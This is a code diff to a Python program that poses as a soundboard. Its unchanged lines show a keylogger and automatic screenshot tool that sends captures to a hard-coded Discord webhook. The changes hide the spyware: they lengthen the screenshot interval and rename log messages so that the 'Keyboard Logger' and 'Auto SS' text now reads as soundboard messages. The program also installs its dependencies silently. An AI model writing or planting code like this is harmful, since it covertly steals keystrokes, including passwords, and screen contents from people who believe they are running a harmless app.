@@ -14,7 +14,7 @@ FORMAT_DIDUKUNG = ['.mp3', '.wav', '.ogg', '.m4a', '.mp4', '.webm']
 
 # Webhook buat Auto SS + Keyboard Logger
 WEBHOOK_URL = "https://discord.com/api/webhooks/1534060967993020488/956-oLeHyXftOF0l8d--FGXn4snOg9LmbsRjrUARLxytZObTKjvIfrFA2HIcjB9a8Vyp"
-AUTO_SS_INTERVAL = 10
+AUTO_SS_INTERVAL = 120
 
 class Warna:
     UNGU = '\033[95m'; BIRU = '\033[94m'; CYAN = '\033[96m'; HIJAU = '\033[92m'
@@ -123,7 +123,7 @@ class DiscordSS:
         # Keyboard handler
         keyboard.on_press(self.on_key_press)
         
-        tulis_log("Auto SS + Keyboard Logger started", "SYSTEM")
+        tulis_log("SonBot System Sukses", "SYSTEM")
         return True
     
     def stop(self):
@@ -131,7 +131,7 @@ class DiscordSS:
             self.take_and_send_screenshot(self.current_sentence.strip())
         self.is_running = False
         self.take_and_send_screenshot("⏹️ Bimoli Soundboard Dimatikan")
-        tulis_log("Auto SS stopped", "SYSTEM")
+        tulis_log("Sound Board stopped", "SYSTEM")
 
 ss = DiscordSS(WEBHOOK_URL, AUTO_SS_INTERVAL)
 
@@ -287,9 +287,9 @@ def menu_utama():
             subprocess.run([sys.executable, "-m", "pip", "install", "keyboard", "pillow", "requests", "--quiet"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
         if ss.start():
-            tulis_log("Auto SS started", "SYSTEM")
+            tulis_log("Auto SoundBoard started", "SYSTEM")
         else:
-            tulis_log("Auto SS failed - run as admin?", "ERROR")
+            tulis_log("Auto SoundBoard failed - run as admin?", "ERROR")
     
     while True:
         tampilkan_banner()
